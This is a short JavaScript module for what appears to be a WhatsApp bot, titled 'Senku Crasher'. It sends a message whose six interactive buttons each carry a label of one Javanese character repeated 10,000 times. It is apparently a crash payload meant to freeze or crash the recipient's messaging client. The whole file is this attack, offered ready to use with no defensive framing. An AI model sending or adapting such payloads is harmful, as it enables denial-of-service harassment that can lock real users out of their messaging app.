async function test(message, sock) {
  const jid = message.key.remoteJid;

  await sock.sendMessage(
    jid,
    {
      image: { url: "menu2.jpg" }, // Replace with local or hosted image
      caption: "🌟 Senku Crasher",
      footer: "My Awesome Bot 🔥",
      media: true,
      interactiveButtons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `Senku crash 1${"ꦾ".repeat(10000)}\n\n`,
            id: "refresh"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `Senku crash 2${"ꦾ".repeat(10000)}\n\n`,
            id: "info"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: `Senku crash 3${"ꦾ".repeat(10000)}\n\n`,
            url: "https://example.com"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `Senku crash 1${"ꦾ".repeat(10000)}\n\n`,
            id: "refresh"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `Senku crash 2${"ꦾ".repeat(10000)}\n\n`,
            id: "info"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: `Senku crash 3${"ꦾ".repeat(10000)}\n\n`,
            url: "https://example.com"
          })
        }

      ]
    },
    {
      quoted: message
    }
  );
}

export default test;
